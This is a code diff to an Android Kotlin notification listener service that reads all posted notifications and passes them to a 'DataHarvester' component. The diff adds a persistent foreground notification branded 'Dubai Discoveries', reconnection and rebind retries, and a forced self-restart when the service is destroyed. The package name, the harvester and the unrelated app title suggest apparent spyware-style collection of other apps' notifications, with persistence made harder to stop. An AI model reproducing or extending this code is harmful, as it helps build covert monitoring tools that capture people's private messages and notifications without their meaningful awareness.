@@ -1,11 +1,21 @@
 package com.devicesync.app.services
 
-import android.service.notification.NotificationListenerService
-import android.service.notification.StatusBarNotification
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.PendingIntent
+import android.content.ComponentName
+import android.content.Context
 import android.content.Intent
+import android.os.Build
 import android.os.Bundle
 import android.os.Parcelable
+import android.service.notification.NotificationListenerService
+import android.service.notification.StatusBarNotification
+import androidx.core.app.NotificationCompat
 import kotlinx.coroutines.*
+import com.devicesync.app.MainActivity
+import com.devicesync.app.R
 import com.devicesync.app.data.repository.DeviceSyncRepository
 import com.devicesync.app.utils.SettingsManager
 import com.devicesync.app.utils.DeviceInfoUtils
@@ -14,11 +24,19 @@ import java.io.Serializable
 
 class NotificationListenerService : NotificationListenerService() {
     
+    companion object {
+        private const val NOTIFICATION_CHANNEL_ID = "notification_listener_channel"
+        private const val FOREGROUND_NOTIFICATION_ID = 1001
+        private const val SERVICE_RESTART_DELAY = 5000L // 5 seconds
+    }
+    
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private lateinit var repository: DeviceSyncRepository
     private lateinit var dataHarvester: DataHarvester
     private lateinit var settingsManager: SettingsManager
     private var deviceId: String? = null
+    private var isServiceRunning = false
+    private var connectionRetryJob: Job? = null
     
     override fun onCreate() {
         super.onCreate()
@@ -48,6 +66,14 @@ class NotificationListenerService : NotificationListenerService() {
             println("🔔 Repository initialized: ${repository != null}")
             println("🔔 DataHarvester initialized: ${dataHarvester != null}")
             println("🔔 SettingsManager initialized: ${settingsManager != null}")
+            
+            // Create notification channel for foreground service
+            createNotificationChannel()
+            
+            // Start foreground service to keep it alive
+            startForegroundService()
+            
+            isServiceRunning = true
             
         } catch (e: Exception) {
             println("❌ Error in NotificationListenerService onCreate: ${e.message}")
@@ -79,6 +105,62 @@ class NotificationListenerService : NotificationListenerService() {
         return DeviceInfoUtils.getDeviceId(this)
     }
     
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                NOTIFICATION_CHANNEL_ID,
+                "Notification Listener Service",
+                NotificationManager.IMPORTANCE_LOW
+            ).apply {
+                description = "Keeps the notification listener service running"
+                setShowBadge(false)
+                enableLights(false)
+                enableVibration(false)
+            }
+            
+            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            notificationManager.createNotificationChannel(channel)
+            println("🔔 Notification channel created")
+        }
+    }
+    
+    private fun startForegroundService() {
+        try {
+            // Create intent for notification tap action
+            val intent = Intent(this, MainActivity::class.java).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            }
+            val pendingIntent = PendingIntent.getActivity(
+                this, 0, intent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+            )
+            
+            // Create persistent notification
+            val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
+                .setContentTitle("Dubai Discoveries")
+                .setContentText("Notification monitoring active")
+                .setSmallIcon(R.drawable.ic_notification)
+                .setContentIntent(pendingIntent)
+                .setOngoing(true)
+                .setAutoCancel(false)
+                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setCategory(NotificationCompat.CATEGORY_SERVICE)
+                .build()
+            
+            // Start foreground service
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(FOREGROUND_NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+            } else {
+                startForeground(FOREGROUND_NOTIFICATION_ID, notification)
+            }
+            
+            println("🔔 Foreground service started with persistent notification")
+            
+        } catch (e: Exception) {
+            println("❌ Error starting foreground service: ${e.message}")
+        }
+    }
+    
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         deviceId = intent?.getStringExtra("deviceId") ?: settingsManager.getDeviceId()
         println("NotificationListenerService started for device: $deviceId")
@@ -90,6 +172,13 @@ class NotificationListenerService : NotificationListenerService() {
         super.onNotificationPosted(sbn)
         
         println("🔔 onNotificationPosted called with notification: ${sbn?.packageName}")
+        
+        // Ensure service is running and connected
+        if (!isServiceRunning) {
+            println("🔔 Service not running, attempting to restart...")
+            scheduleReconnection()
+            return
+        }
         
         if (sbn == null) {
             println("🔔 Received null notification, skipping")
@@ -358,17 +447,100 @@ class NotificationListenerService : NotificationListenerService() {
     
     override fun onListenerConnected() {
         super.onListenerConnected()
-        println("NotificationListenerService connected")
+        println("🔔 NotificationListenerService connected successfully")
+        isServiceRunning = true
+        
+        // Cancel any pending retry jobs
+        connectionRetryJob?.cancel()
+        
+        // Update notification to show connected status
+        updateNotificationStatus("Connected and monitoring")
     }
     
     override fun onListenerDisconnected() {
         super.onListenerDisconnected()
-        println("NotificationListenerService disconnected")
+        println("🔔 NotificationListenerService disconnected")
+        isServiceRunning = false
+        
+        // Update notification to show disconnected status
+        updateNotificationStatus("Disconnected - attempting to reconnect")
+        
+        // Schedule reconnection attempt
+        scheduleReconnection()
+    }
+    
+    private fun scheduleReconnection() {
+        connectionRetryJob?.cancel()
+        connectionRetryJob = serviceScope.launch {
+            delay(SERVICE_RESTART_DELAY)
+            println("🔔 Attempting to reconnect notification listener service...")
+            
+            try {
+                // Try to restart the service
+                val intent = Intent(this@NotificationListenerService, NotificationListenerService::class.java)
+                startService(intent)
+                
+                // If that doesn't work, try to request rebinding
+                if (!isServiceRunning) {
+                    println("🔔 Service restart failed, requesting rebinding...")
+                    try {
+                        requestRebind(ComponentName(this@NotificationListenerService, NotificationListenerService::class.java))
+                    } catch (e: Exception) {
+                        println("❌ Failed to request rebinding: ${e.message}")
+                    }
+                }
+            } catch (e: Exception) {
+                println("❌ Error during reconnection attempt: ${e.message}")
+            }
+        }
+    }
+    
+    private fun updateNotificationStatus(status: String) {
+        try {
+            val intent = Intent(this, MainActivity::class.java).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            }
+            val pendingIntent = PendingIntent.getActivity(
+                this, 0, intent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+            )
+            
+            val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
+                .setContentTitle("Dubai Discoveries")
+                .setContentText(status)
+                .setSmallIcon(R.drawable.ic_notification)
+                .setContentIntent(pendingIntent)
+                .setOngoing(true)
+                .setAutoCancel(false)
+                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setCategory(NotificationCompat.CATEGORY_SERVICE)
+                .build()
+            
+            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            notificationManager.notify(FOREGROUND_NOTIFICATION_ID, notification)
+            
+        } catch (e: Exception) {
+            println("❌ Error updating notification status: ${e.message}")
+        }
     }
     
     override fun onDestroy() {
         super.onDestroy()
+        println("🔔 NotificationListenerService being destroyed")
+        
+        isServiceRunning = false
+        connectionRetryJob?.cancel()
         serviceScope.cancel()
-        println("NotificationListenerService destroyed")
+        
+        // Try to restart the service if it was killed
+        try {
+            val intent = Intent(this, NotificationListenerService::class.java)
+            startService(intent)
+            println("🔔 Attempting to restart service after destruction")
+        } catch (e: Exception) {
+            println("❌ Failed to restart service: ${e.message}")
+        }
+        
+        println("🔔 NotificationListenerService destroyed")
     }
 }
